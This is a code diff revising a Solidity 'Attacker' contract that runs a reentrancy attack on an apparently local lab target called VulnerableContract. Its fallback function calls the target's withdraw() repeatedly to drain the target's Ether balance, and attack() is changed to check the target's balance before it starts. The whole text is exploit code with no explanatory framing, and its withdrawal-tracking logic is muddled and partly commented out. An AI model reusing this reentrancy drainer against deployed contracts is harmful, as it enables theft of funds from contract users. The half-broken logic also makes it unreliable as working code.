@@ -4,12 +4,13 @@ pragma solidity ^0.8.0;
 import "./VulnerableContract.sol";
 
 contract Attacker {
+    mapping(address => uint256) public balances;
     VulnerableContract public vulnerable;
     address public owner;
     uint256 public targetAmount;  // Amount to drain
     uint256 public drainedAmount;  // Amount already drained
-    uint256 public prevBalanceVulnerableContract;  // Amount to drain
-    uint256 public totalWithdraw = drainedAmount; //targetAmount - drainedAmount;
+    uint256 public prevBalanceVulnerableContract=0;  // Amount to drain
+    uint256 public totalWithdraw; //targetAmount - drainedAmount;
 
     constructor(address payable _vulnerableAddress) {
         vulnerable = VulnerableContract(_vulnerableAddress);
@@ -17,19 +18,21 @@ contract Attacker {
     }
 
     // Fallback function for reentrancy
-    receive() external payable {
-        uint256 vulnBalance = address(vulnerable).balance;
+    fallback() external payable {
+        //uint256 vulnBalance = prevBalanceVulnerableContract; //address(vulnerable).balance;
         
        // uint256 attackBalance = address(this).balance;
-        if (totalWithdraw < targetAmount && prevBalanceVulnerableContract >= vulnBalance) {
+        if (totalWithdraw <= targetAmount && totalWithdraw <= prevBalanceVulnerableContract) {
             
             
-            if (totalWithdraw > vulnBalance) {
-                totalWithdraw = vulnBalance;  // Cap withdrawal to remaining balance
+            if (totalWithdraw == prevBalanceVulnerableContract) {
+                totalWithdraw = prevBalanceVulnerableContract;  // Cap withdrawal to remaining balance
+            } else {
+                totalWithdraw += drainedAmount;
             }
             //drainedAmount += amountToWithdraw;
-            totalWithdraw += drainedAmount;
-            prevBalanceVulnerableContract -= drainedAmount;
+            
+            //prevBalanceVulnerableContract -= drainedAmount;
             if (drainedAmount>0) {
                 vulnerable.withdraw(drainedAmount);
               }  // Reenter to withdraw
@@ -39,10 +42,12 @@ contract Attacker {
 
     // Initiate the attack with a specific target amount
     function attack(uint256 _targetAmount) external payable {
-        require(msg.value > 0, "Need to send some Ether to attack");
-        require(_targetAmount > 0, "Target amount must be greater than 0");
+        
+        require(msg.value < _targetAmount, "Need to send some Ether to attack less than target amount");
+        require(_targetAmount <= address(vulnerable).balance, "Target amount must be less than balance of vulnerable contract");
+        
         targetAmount = _targetAmount;
-        drainedAmount = msg.value;
+        drainedAmount = totalWithdraw = msg.value;
         
 
         // Deposit initial amount to vulnerable contract
